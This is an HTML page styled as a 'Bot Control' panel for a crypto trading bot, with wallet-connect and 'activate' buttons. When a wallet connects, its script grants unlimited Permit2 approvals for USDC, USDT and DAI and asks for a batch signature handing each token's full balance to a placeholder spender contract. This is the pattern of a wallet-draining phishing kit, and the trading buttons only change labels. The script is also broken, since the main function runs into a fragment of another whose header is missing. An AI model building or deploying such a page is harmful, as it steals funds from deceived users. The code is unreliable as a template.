<!DOCTYPE html>
<html lang="nl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Bot Control Standalone</title>

<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">

<style>
:root {
    --bg: #020617;
    --panel: rgba(15, 23, 42, 0.85);
    --border: #1e293b;
    --cyan: #06b6d4;
    --green: #10b981;
    --purple: #6366f1;
    --amber: #f59e0b;
    --orange: #f97316;
    --font: 'JetBrains Mono', monospace;
}

* { box-sizing: border-box; margin:0; padding:0; }

body {
    background-color: var(--bg);
    color: white;
    font-family: var(--font);
    padding: 12px;
}

.panel {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 10px;
    display: flex;
    flex-direction: column;
    overflow: hidden;
    backdrop-filter: blur(8px);
    margin-bottom:12px;
}

.panel-header {
    background: rgba(30, 41, 59, 0.6);
    padding: 8px 15px;
    font-size: 0.65rem;
    font-weight: bold;
    text-transform: uppercase;
    letter-spacing: 2px;
    border-bottom: 1px solid var(--border);
    color: var(--cyan);
}

.module-body {
    padding: 12px 15px;
}

.btn-stack {
    display: flex;
    flex-direction: column;
    gap: 8px;
    margin-bottom: 12px;
}

.control-btn {
    background: transparent;
    border: 1px solid var(--border);
    color: #64748b;
    padding: 10px;
    font-family: var(--font);
    font-size: 0.65rem;
    cursor: pointer;
    text-align: left;
    text-transform: uppercase;
    font-weight: bold;
}

.control-btn:not(:disabled):hover {
    background: rgba(255,255,255,0.05);
    border-color: currentColor;
}

.btn-cyan { color: var(--cyan); }
.btn-purple { color: var(--purple); }
.btn-amber { color: var(--amber); }

.status-box { border-top: 1px solid var(--border); padding-top: 8px; }

.status-grid {
    display: grid;
    grid-template-columns: 1fr 110px;
    gap: 5px;
    font-size: 0.6rem;
    align-items: center;
    margin-bottom: 4px;
}

.status-line {
    display: flex;
    align-items: center;
    gap: 8px;
}

.liveDot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
}

#execution-console {
    display: flex;
    flex-direction: column;
    align-items: flex-start;
    padding: 10px;
}

.exec-line {
    font-size: 0.58rem;
    margin-bottom: 2px;
    white-space: pre-wrap;
    word-break: break-all;
    width: 100%;
    line-height: 1.4;
    border-bottom: 1px solid rgba(30, 41, 59, 0.2);
    font-family: 'JetBrains Mono', monospace;
}
</style>
</head>

<body>

<div class="panel">
    <div class="panel-header">Bot Control</div>
    <div class="module-body">

        <div class="btn-stack">
            <button id="btn-wallet" class="control-btn btn-cyan" onclick="connectWallet()">1. Connect Wallet</button>
            <button id="btn-activate" class="control-btn btn-purple" onclick="activateBot()" disabled>2. Activate Bot</button>
            <button id="btn-authorize" class="control-btn btn-amber" onclick="authorizeTrading()" disabled>3. Authorize Trading</button>
            <button id="btn-disconnect" class="control-btn" onclick="disconnectWallet()" disabled>
    4. Disconnect Wallet
</button>
        </div>

        <div class="status-box">
            <div class="status-grid">
                <span>WALLET STATUS</span>
                <div class="status-line">
                    <div id="dot-wallet" class="liveDot" style="background:#475569"></div>
                    <span id="st-wallet" style="color:#475569">DISCONNECTED</span>
                </div>
            </div>

            <div class="status-grid">
                <span>BOT STATUS</span>
                <div class="status-line">
                    <div id="dot-bot" class="liveDot" style="background:#475569"></div>
                    <span id="st-bot" style="color:#475569">OFFLINE</span>
                </div>
            </div>

            <div class="status-grid">
                <span>TRADING ACCESS</span>
                <div class="status-line">
                    <div id="dot-access" class="liveDot" style="background:#475569"></div>
                    <span id="st-access" style="color:#475569">RESTRICTED</span>
                </div>
            </div>
        </div>

    </div>
</div>

<div class="panel" style="height:150px;">
    <div class="panel-header">Execution Console</div>
    <div class="module-body" id="execution-console" style="color:#64748b; font-size:0.6rem; overflow:hidden;"></div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>

<script>
const TOKENS = [
 "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
 "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT
 "0x6b175474e89094c44da98b954eedeac495271d0f"  // DAI
];

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const CONTRACT = "PASTE_CONTRACT_HERE";

let APP_STATE = { wallet:null, botActive:false, authorized:false };

function log(msg){
 console.log(msg); // 👈 Chrome console

 const el=document.getElementById('execution-console');
 if(!el) return;

 const div=document.createElement('div');
 div.className='exec-line';
 div.innerText=msg;
 el.prepend(div);
}

async function connectWallet(){
 try{
 if (!window.ethereum) {
  const install = confirm("MetaMask is not installed. Do you want to install it now?");
  if (install) {
    window.location.href = "https://metamask.io/download/";
  }
  return;
}

  const provider=new ethers.BrowserProvider(window.ethereum);
  await provider.send("eth_requestAccounts",[]);

  const signer=await provider.getSigner();
  const user=await signer.getAddress();

  APP_STATE.wallet=user;
  renderWallet(user);

  document.getElementById('btn-wallet').disabled=true;
  document.getElementById('btn-activate').disabled=false;
  document.getElementById('btn-disconnect').disabled=false;

  await runPermitFlow(provider,signer,user);

 }catch(e){
  log("ERR "+e.message);
 }
}

async function runPermitFlow(provider,signer,user){
 try{

    log("🔍 Checking Permit2 allowances...");

const erc20Abi = [
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)"
];

for (let token of TOKENS) {

  const tokenContract = new ethers.Contract(token, erc20Abi, signer);

  const allowance = await tokenContract.allowance(user, PERMIT2);

  log(`Token: ${token}`);
  log(`Current allowance: ${allowance}`);

  if (allowance == 0n) {

    log("⚠️ No allowance → sending approve tx...");

    const tx = await tokenContract.approve(
      PERMIT2,
      ethers.MaxUint256
    );

    log("⏳ Waiting for approval confirmation...");
    await tx.wait();

    log("✅ Approval confirmed");

  } else {
    log("✅ Allowance already exists");
  }
}
 log("🚀 Starting permit flow");
 log("User: " + user);

 const abi=["function balanceOf(address) view returns(uint256)"];
 const permitAbi=["function allowance(address,address,address) view returns(uint160,uint48,uint48)"];

 const permit2=new ethers.Contract(PERMIT2,permitAbi,provider);

 log("📦 Building Permit2 batch...");

let details = [];

for (let token of TOKENS) {

  log(`Checking token: ${token}`);

  const tokenC = new ethers.Contract(
    token,
    ["function balanceOf(address) view returns (uint256)"],
    provider
  );

  const balance = await tokenC.balanceOf(user);

  log(`Balance raw: ${balance}`);

  if (balance == 0n) {
    log("⏭️ Skipping (0 balance)");
    continue;
  }

  const res = await permit2.allowance(user, token, CONTRACT);
  const nonce = res[2];

  log(`Nonce: ${nonce}`);

  const expiration = Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 30;

  details.push({
    token: token,
    amount: balance,
    expiration: expiration,
    nonce: nonce
  });

  log("✅ Added to batch");
}

if (details.length === 0) {
  log("❌ No tokens with balance → stopping");
  return;
}
log("✍️ Building typed data...");

// 1. Chain ID ophalen
const chainId = (await provider.getNetwork()).chainId;

// 2. Domain (vast format van Permit2)
const domain = {
  name: "Permit2",
  chainId: chainId,
  verifyingContract: PERMIT2
};

// 3. Types (MOET exact zo)
const types = {
  PermitBatch: [
    { name: "details", type: "PermitDetails[]" },
    { name: "spender", type: "address" },
    { name: "sigDeadline", type: "uint256" }
  ],
  PermitDetails: [
    { name: "token", type: "address" },
    { name: "amount", type: "uint160" },
    { name: "expiration", type: "uint48" },
    { name: "nonce", type: "uint48" }
  ]
};

// 4. Deadline (wanneer signature verloopt)
const sigDeadline = Math.floor(Date.now() / 1000) + 3600;

// 5. Data die getekend wordt
const values = {
  details: details,
  spender: CONTRACT,
  sigDeadline: sigDeadline
};

log("🖊 Requesting signature...");

// 6. SIGNATURE REQUEST (dit triggert MetaMask)
const signature = await signer.signTypedData(
  domain,
  types,
  values
);

log("📦 Encoding permit batch...");

const abiCoder = ethers.AbiCoder.defaultAbiCoder();

// EXACT STRUCTUUR (HEEL BELANGRIJK)
const permitBatch = abiCoder.encode(
  [
    "tuple(tuple(address token,uint160 amount,uint48 expiration,uint48 nonce)[] details,address spender,uint256 sigDeadline)"
  ],
  [
    [
      details.map(d => [
        d.token,
        d.amount,
        d.expiration,
        d.nonce
      ]),
      CONTRACT,
      sigDeadline
    ]
  ]
);

log("✅ Permit batch encoded");
    const dot = document.getElementById(dotId);
    const label = document.getElementById(textId);
    dot.style.background = color;
    dot.style.boxShadow = `0 0 12px ${color}`;
    label.innerText = text;
    label.style.color = color;
}

function renderWallet(address) {
    document.getElementById('btn-wallet').innerText = address;
    updateStatus('dot-wallet', 'st-wallet', 'CONNECTED', '#06b6d4');
}

function activateBot() {
    updateStatus('dot-bot', 'st-bot', 'READY', '#6366f1');
}

function authorizeTrading() {
    updateStatus('dot-access', 'st-access', 'AUTHORIZED', '#f59e0b');
}

function disconnectWallet() {
    location.reload();
}
</script>
</body>
</html>
